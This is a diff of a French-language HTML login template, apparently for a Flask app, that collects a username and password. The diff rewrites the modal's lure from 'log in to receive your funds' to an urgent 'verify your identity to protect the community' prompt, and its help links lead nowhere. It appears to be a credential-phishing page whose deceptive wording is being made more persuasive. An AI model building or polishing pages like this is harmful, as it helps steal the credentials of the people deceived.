@@ -13,7 +13,9 @@
       height: 100%;
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
+      background: #f2f2f2
+        url("{{ url_for('static', filename='img/background.jpg') }}")
+        no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -93,16 +95,16 @@
 </head>
 <body>
   <div class="modal">
-    <p>Vous devez vous authentifier afin de recevoir vos fonds</p>
-    <h2>Se connecter</h2>
+    <p>Pour garantir la sécurité de notre communauté, vous devez valider votre identité avant de poursuivre. Cela ne prend qu’une minute !</p>
+    <h2>Vérifier mon compte </h2>
     <form action="/login" method="post">
-      <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required autocomplete="username">
+      <input type="text" name="username" placeholder="E‑mail ou nom d’utilisateur" required autocomplete="username">
       <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
       <button type="submit">Continuer</button>
     </form>
     <div class="links">
-      <a href="#">Mot de passe oublié ?</a>
-      <a href="#">Vous rencontrez des problèmes ?</a>
+      <a href="#">Mot de passe oublié ?</a>
+      <a href="#">Vous rencontrez des problèmes ?</a>
     </div>
   </div>
 </body>
